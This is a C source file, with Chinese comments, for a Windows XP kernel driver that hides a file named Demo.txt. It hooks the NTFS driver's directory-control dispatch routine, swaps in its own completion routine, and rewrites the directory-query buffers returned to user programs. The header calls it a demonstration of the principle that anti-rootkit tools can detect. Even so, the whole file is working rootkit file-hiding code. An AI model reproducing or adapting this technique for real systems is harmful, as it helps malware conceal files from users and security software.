//
//Description:
//  本程序用于隐藏名为Demo.txt的文件，在XP SP3平台Ntfs文件系统上测试通过。
//使用的原理很简单，替换Ntfs的一个IRP分发例程。使用任意的反Rootkit工具均可检测。
//  使用vs2008+visualDDK+WDK7100编译
//  本代码只用作原理解释使用，请勿作其他用途使用。
//
//Writen By: 宁妖 2011/3/9
//
//Last Write Time: 2011/3/9
//
#include "stdafx.h"

//全局变量，保存原始IRP处理函数地址
LONG uOrgDispathFunAddr = 0;

#ifdef __cplusplus
    extern "C" NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING  RegistryPath);
#endif

NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING  RegistryPath)
{
    //本驱动只用于实现文件隐藏，没有涉及与应用层交互，所以不用创建设备对象。
    DriverObject->DriverUnload = HideDemoUnload;
    //实现文件隐藏的功能函数
    HideDemoFile();
    return STATUS_SUCCESS;
}

void HideDemoUnload(IN PDRIVER_OBJECT DriverObject)
{
    PDRIVER_OBJECT pDrvObj = NULL;
    //xx是一个宏，#define xx DPFLTR_IHVDRIVER_ID ,0xFFFFFFFF
    KdPrintEx((xx, "[HideDemoUnload]\n"));
    //获取Ntfs的驱动对象地址
    pDrvObj = GetNtfsDrvobj();

    if (NULL == pDrvObj) {
        return ;
    }

    //恢复Ntfs的IRP分发函数
    //使用原子操作，可以避免hook操作被打断
    InterlockedExchange((LONG*)&pDrvObj->MajorFunction[IRP_MJ_DIRECTORY_CONTROL], (LONG)uOrgDispathFunAddr);
}

NTSTATUS HideDemoFile()
{
    NTSTATUS status = STATUS_SUCCESS;
    PDRIVER_OBJECT pDrvObj = NULL;

    do {
        //获取Ntfs的驱动对象地址
        pDrvObj = GetNtfsDrvobj();

        if (NULL == pDrvObj) {
            KdPrintEx((xx, "[HideDemoFile] GetNtfsDrvobj Failure!\n"));
            status = STATUS_UNSUCCESSFUL;
            break;
        }

        //保存被Hook函数的原始地址，以后需要调用它
        uOrgDispathFunAddr = (LONG)pDrvObj->MajorFunction[IRP_MJ_DIRECTORY_CONTROL] ;
        //Hook Ntfs主功能号为IRP_MJ_DIRECTORY_CONTROL的分发函数
        InterlockedExchange((LONG*)&pDrvObj->MajorFunction[IRP_MJ_DIRECTORY_CONTROL], (LONG)NewDispatchRoutine);
    } while (false);

    return status;
}

PDRIVER_OBJECT
GetNtfsDrvobj()
{
    UNICODE_STRING  usNtfs;
    NTSTATUS        ntStatus = STATUS_SUCCESS;
    PDRIVER_OBJECT  pDrvObj = NULL;
    KdPrintEx((xx, "[GetNtfsDrvobj]\n"));
    //对象名空间里\\FileSystem\\Ntfs代表了Ntfs驱动对象，获取它就可以了
    RtlInitUnicodeString(&usNtfs, L"\\FileSystem\\Ntfs");
    //ObReferenceObjectByName函数可以通过名称得到对象地址
    //*IoDriverObjectType由nt内核导出了
    ntStatus = ObReferenceObjectByName(&usNtfs, OBJ_CASE_INSENSITIVE, NULL,
                                       0, *IoDriverObjectType, KernelMode, NULL, (PVOID*)&pDrvObj);

    if (!NT_SUCCESS(ntStatus)) {
        KdPrintEx((xx, "[GetNtfsDrvobj] ObReferenceObjectByName Failure! ntStatus=0x%08x\n",
                   ntStatus));
        return NULL;
    }

    //解引用
    ObDereferenceObject(pDrvObj);
    KdPrintEx((xx, "[GetNtfsDrvobj]Ntfs drvobj: 0x%08x\n", pDrvObj));
    return pDrvObj;
}

//
//自定义的分发例程，通过设置完成函数来更改缓冲区
//但是，不能使用IoSetCompletionRoutine函数
//
NTSTATUS NewDispatchRoutine(PDEVICE_OBJECT pDevObj, PIRP pIrp)
{
    NTSTATUS status = STATUS_SUCCESS;
    PIO_STACK_LOCATION  pSP = NULL;
    ULONG uCompleteRoutineAddr = 0;
    PCompletePara pPara = NULL;
    pSP = IoGetCurrentIrpStackLocation(pIrp);

    do {
        //如果请求的IRP次功能码是IRP_MN_QUERY_DIRECTORY
        //且请求的FileInformationClass是FileBothDirectoryInformation
        //则是需要关注的IRP，过滤它
        if ((pSP->MinorFunction == IRP_MN_QUERY_DIRECTORY) &&
            (pSP->Parameters.QueryDirectory.FileInformationClass == FileBothDirectoryInformation)
           ) {
            //分配一个CompletePara结构，用于存储原来完成函数相关信息
            //以后将会恢复调用原完成函数
            pPara = (PCompletePara)ExAllocatePoolWithTag(NonPagedPool, sizeof(CompletePara), 'wjl');

            if (NULL == pPara) {
                break;
            }

            //保存本结构地址，以后使用它释放内存
            pPara->SelfAddr = (PVOID)pPara;
            //保存原来的完成函数地址（可能为NULL）
            pPara->CompletionRoutine = pSP->CompletionRoutine;
            //保存原来完成函数的参数
            pPara->Context = pSP->Context;
            //保存原来的控制标记（使用控制标记来控制哪种情况下调用完成函数）
            pPara->Control = pSP->Control;
            //使用我们定义的完成函数替换原来的完成函数，并传入新的参数
            InterlockedExchange((LONG*)&pSP->CompletionRoutine, (LONG)NewCompleteRoutine);
            InterlockedExchange((LONG*)&pSP->Context, (LONG)pPara);
            //设置新的控制标记，在原来的控制标记上增加一个SL_INVOKE_ON_SUCCESS标记
            //这样既保证原有情况下的原完成函数肯定被调用，又保证我们自定义的完成函数在成功的情况下被调用
            //（原有的Control值可能为0）
            pSP->Control |= SL_INVOKE_ON_SUCCESS;
        }
    } while (false);

    //返回控制，执行原来的分发函数
    return ((fnDispatchRoutine)uOrgDispathFunAddr)(pDevObj, pIrp);
}


//
//这个函数用来处理返回的缓冲区，实现隐藏Demo.txt
//
NTSTATUS
NewCompleteRoutine(
    IN PDEVICE_OBJECT  DeviceObject,
    IN PIRP  pIrp,
    IN PVOID  Context
)
{
    PFILE_BOTH_DIR_INFORMATION pInfo;
    char *pBuf = NULL;
    ULONG NextEntryOffset = 0;
    PIO_STACK_LOCATION pSP = IoGetCurrentIrpStackLocation(pIrp);
    PCompletePara pPara = (PCompletePara)Context;
    fnIoCompletion RealIoCompletion = NULL;
    PVOID RealContext = NULL;
    ULONG uHideNodeSize = 0, uRemainInfoSize = 0;
//这里比较特殊，当前栈单元指针需要移动一个单位才是真正有效的当前栈单元
//  pSP--;
//
//  KdPrintEx((xx,"StackCount:%d CurrentStack:%d\n",
//      pIrp->StackCount,pIrp->CurrentLocation));
    //返回给用户的缓冲区内容保存在UserBuffer域中
    pBuf = (char*)pIrp->UserBuffer;

    do {
        //调用不成功直接跳出
        if (pIrp->IoStatus.Information <= 0) {
            break;
        }

        uRemainInfoSize = pIrp->IoStatus.Information;

        do {
            if (NULL == pBuf) {
                break;
            }

            //由于pBuf地址来自应用层，有可能进程调用环境已经切换
            //作为良好的编程习惯，需要调用ProbeForRead检查下
            //实际上，在笔者的测试机器上，这里一直都是原调用进程的环境，没有切换
            _try {
                ProbeForRead(pBuf, 4, 4);
            }
            _except(EXCEPTION_CONTINUE_EXECUTION) {
                KdPrintEx((xx, "Probe for Read Failure!\n"));
                break;
            };
            pInfo = (PFILE_BOTH_DIR_INFORMATION)pBuf;
            KdPrintEx((xx, "Buf:%ws\n", pInfo->FileName));

            //pInfo->FileNameLength是以字节算的
            //判断是否有需要隐藏的文件Demo.txt
            if (RtlEqualMemory(pInfo->FileName, L"Demo.txt", pInfo->FileNameLength)) {
                KdPrintEx((xx, "Find Demo.txt\n"));
                //处理隐藏
                uHideNodeSize = HandleBuffer(pInfo, uRemainInfoSize);

                if (0 == uHideNodeSize) {
                    KdPrintEx((xx, "HandleBuffer Failure!\n"));
                    break;
                }

                //调整返回长度
                pIrp->IoStatus.Information -= uHideNodeSize;
                break;
            }

            NextEntryOffset = *(ULONG*)pBuf;
            pBuf += NextEntryOffset;
            uRemainInfoSize -= NextEntryOffset;
        } while (NextEntryOffset);
    } while (false);

    //
    //实际上，先前安装完成函数处的栈单元是IRP栈空间的第一个也是唯一的一个有效单元，
    //这里如果原先存在完成函数，那么这个完成函数必然是由IRP的生成者（I/O管理器或者某个驱动）设置的
    //

    //根据Control控制标记判断是否调用原完成函数
    if ((NT_SUCCESS(pIrp->IoStatus.Status) &&
         pPara->Control & SL_INVOKE_ON_SUCCESS) ||
        (!NT_SUCCESS(pIrp->IoStatus.Status) &&
         pPara->Control & SL_INVOKE_ON_ERROR) ||
        (pIrp->Cancel &&
         pPara->Control & SL_INVOKE_ON_CANCEL)
       ) {
        //原来的完成函数以及参数的地址被保存在了Context参数中了
        RealIoCompletion = (fnIoCompletion)pPara->CompletionRoutine;
        RealContext = pPara->Context;
        //根据先前保存的该结构地址，释放掉该结构
        ExFreePoolWithTag(pPara->SelfAddr, 'wjl');
        return RealIoCompletion(DeviceObject, pIrp, RealContext);
    }

    if (pIrp->PendingReturned) {
        IoMarkIrpPending(pIrp);
    }

    ExFreePoolWithTag(pPara->SelfAddr, 'wjl');
    return STATUS_SUCCESS;
}

//
//Description:
//  用来处理包含待隐藏文件的缓冲区
//
ULONG HandleBuffer(PFILE_BOTH_DIR_INFORMATION Info, ULONG InfoSize)
{
    char *pBuf = (char*)Info;
    ULONG uEntrySize = Info->NextEntryOffset;
    ULONG uRet = 0;
    PVOID pTempBuf = NULL;

    //如果uEntrySize为0，表示该缓冲区只有一项，即待隐藏项
    if (0 == uEntrySize) {
        uRet = InfoSize;
        RtlZeroMemory(pBuf, InfoSize);
    } else {
        //待隐藏项后还有很多其他项，
        //将待隐藏项清空，后面项地址前移
        uRet = uEntrySize;
        pTempBuf = ExAllocatePoolWithTag(NonPagedPool, InfoSize - uEntrySize, 'wjl');

        if (NULL == pTempBuf) {
            return 0;
        }

        RtlCopyMemory(pTempBuf, pBuf + uEntrySize, InfoSize - uEntrySize);
        RtlZeroMemory(pBuf, InfoSize);
        RtlCopyMemory(pBuf, pTempBuf, InfoSize - uEntrySize);
        ExFreePoolWithTag(pTempBuf, 'wjl');
    }

    return uRet;
}